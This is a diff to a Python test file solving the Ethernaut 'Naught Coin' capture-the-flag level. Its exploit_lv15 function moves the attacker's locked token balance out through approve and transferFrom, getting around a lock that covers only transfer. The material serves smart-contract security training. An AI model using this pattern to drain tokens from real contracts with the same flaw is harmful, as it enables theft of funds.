@@ -5,25 +5,27 @@ from pytypes.contracts.lv15_naught_coin import NaughtCoin
 
 @default_chain.connect()
 def test_lv15():
+    
     ethernaut = EthernautDeployer(default_chain)
     contract = ethernaut.deploy_lv15()
-    exploit_lv15(contract, ethernaut.attacker)
+    exploit_lv15(contract, ethernaut.attacker, ethernaut.other_account)
     ethernaut.check_lv15(contract)
 
-def exploit_lv15(contract: NaughtCoin, attacker: Account):
-    another_account_of_attacker = default_chain.accounts[2]
+def exploit_lv15(contract: NaughtCoin, attacker: Account, other_account: Account):
+    # Attack vector:
+    # Training:
     
     contract.approve(
-        spender=another_account_of_attacker,
+        spender=other_account,
         value_=contract.balanceOf(attacker.address),
         from_=attacker
     )
     
     contract.transferFrom(
         attacker.address,
-        another_account_of_attacker.address,
+        other_account.address,
         contract.balanceOf(attacker.address),
-        from_=another_account_of_attacker
+        from_=other_account
     )
 
 
